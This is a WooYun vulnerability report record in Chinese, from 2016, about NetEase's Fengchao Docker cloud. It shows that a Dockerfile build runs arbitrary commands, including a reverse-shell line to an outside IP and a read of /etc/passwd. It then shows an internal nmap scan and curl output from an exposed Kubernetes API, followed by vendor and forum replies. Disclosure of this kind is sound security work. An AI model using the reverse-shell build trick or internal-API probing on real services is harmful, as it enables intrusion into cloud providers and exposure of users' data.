{"id": 74270, "wybug_id": "wooyun-2016-0168160", "wybug_title": "公有云安全之网易蜂巢docker云服务设计不当导致一些内部API泄露", "wybug_corp": "网易", "wybug_author": "boooooom", "wybug_date": "2016-01-07 21:03", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 网易蜂巢挺不错的，帮你们测试一下哇，为了帮你们测试已欠费5毛；看起来感觉挺好用的啊。据说为开发者打造的基于Docker的容器云，全SSD助力极速打造云端应用！  详细说明：  1.创建镜像这个地方支持使用dockfile进行构建https://c.163.com/dashboard#/m/repo/create/那么我们知道dockfile是可以执行任意命令的2.利用dockfile构建时执行任意命令，可shell\n# Memcached## VERSION       2.2# use the ubuntu base image provided by dotCloudFROM ubuntuMAINTAINER Victor Coisne victor.coisne@dotcloud.comRUN sleep 1RUN cat /etc/passwd# make sure the package repository is up to dateRUN echo \"deb http://mirrors.163.com/ubuntu/ precise main restricted universe multiverse\" > /etc/apt/sources.listRUN apt-get updateRUN echo \"while ((1));do sleep 1;echo 111;/bin/sh -i >& /dev/tcp/1.1.1.1/1234 0>&1;done\" >> /tmp/1.shRUN bash /tmp/1.shRUN sleep 20# install memcachedRUN apt-get install -y memcached# Launch memcached when launching the containerENTRYPOINT [\"memcached\"]# run memcached as the daemon userUSER daemon# expose memcached portEXPOSE 11211\n3.通过反弹shell获取其中一台构建服务器的权限，然后对172网段进行了一下探测，发现\n172.17.42.1Starting Nmap 5.21 ( http://nmap.org ) at 2016-01-07 15:36 UTCNmap scan report for 172.17.42.1Host is up (0.000013s latency).Not shown: 989 closed portsPORT     STATE SERVICE80/tcp   open  http111/tcp  open  rpcbind443/tcp  open  https1046/tcp open  unknown6000/tcp open  X117001/tcp open  afs3-callback8010/tcp open  xmpp8011/tcp open  unknown8081/tcp open  blackice-icecap8181/tcp open  unknown9091/tcp open  unknown\n通过分析172.17.42.1就是蜂巢的官网，而172.17.42.1:8081是内部api\n# curl 172.17.42.1:8081  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100   202  100   202    0     0   211k      0 --:--:-- --:--:-- --:--:--  197k{  \"paths\": [    \"/api\",    \"/api/v1\",    \"/healthz\",    \"/healthz/ping\",    \"/logs/\",    \"/metrics\",    \"/resetMetrics\",    \"/swagger-ui/\",    \"/swaggerapi/\",    \"/ui/\",    \"/version\"  ]}#\n通过这个接口大概能看到有1522个uid的信息\n# curl 172.17.42.1:8081/api/v1/namespaces|grep uid|sort|uniq |wc -l  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  793k    0  793k    0     0  6053k      0 --:--:-- --:--:-- --:--:-- 6100k1522\n\n# curl 172.17.42.1:8081/api/v1/namespaces  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{  \"kind\": \"NamespaceList\",  \"apiVersion\": \"v1\",  \"metadata\": {    \"selfLink\": \"/api/v1/namespaces\",    \"resourceVersion\": \"135465264\"  },  \"items\": [    {      \"metadata\": {        \"name\": \"0007c326cb3241ad8046f332d49f8994\",        \"selfLink\": \"/api/v1/namespaces/0007c326cb3241ad8046f332d49f8994\",        \"uid\": \"a693f499-b41a-11e5-a8e3-ecf4bbd96674\",        \"resourceVersion\": \"127645252\",        \"creationTimestamp\": \"2016-01-06T02:10:26Z\",        \"labels\": {          \"name\": \"0007c326cb3241ad8046f332d49f8994\"        }      },      \"spec\": {        \"finalizers\": [          \"kubernetes\"        ]      },\n其他的一些接口就没有仔细测了   漏洞证明：  \n\n\n\n   修复方案：  自有服务的api需要和用户环境隔离   版权声明：转载请注明来源 boooooom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2016-01-11 09:59 厂商回复： 该漏洞已提交修复，白帽子漏洞利用描述清楚，感谢您对网易的支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-07 21:18 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:743 漏洞数:113        | ®高级安全工程师 | WooYun认证√)\t\t \n  前排学习云安全    \n     2016-01-07 21:53 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1485 漏洞数:228        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @举起手来    \n     2016-01-07 22:00 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:333 漏洞数:67        | 慢慢挖洞)\t\t \n  前排学习云安全    \n     2016-01-07 23:17 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  必须忽略，公有云安全问题不管！我这挖了好多洞了！    \n     2016-01-07 23:20 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:473 漏洞数:51        | 我有一个好想法！)\t\t \n  我的问题，测的有点不严谨了，应该不涉及内网。抱歉。    \n     2016-01-07 23:20 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:473 漏洞数:51        | 我有一个好想法！)\t\t \n  我的问题，测的有点不严谨了，应该不涉及内网。抱歉。    \n     2016-01-07 23:34 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  宝贝，我专门挖网易的，网易蜂巢这块就别弄了，没分    \n     2016-01-08 00:36 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:473 漏洞数:51        | 我有一个好想法！)\t\t \n  更新了一些其他问题    \n     2016-01-11 10:54 |    \t\tmissy \t\t\t( 普通白帽子  |\t\t\t        Rank:816 漏洞数:219        | .....-3-3-3-3-3-3-3-3-3-3-3-3-3)\t\t \n  mark    \n     2016-02-23 10:33 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:27        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  也可以测试一下daocloud,时速云，灵雀云的情况    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}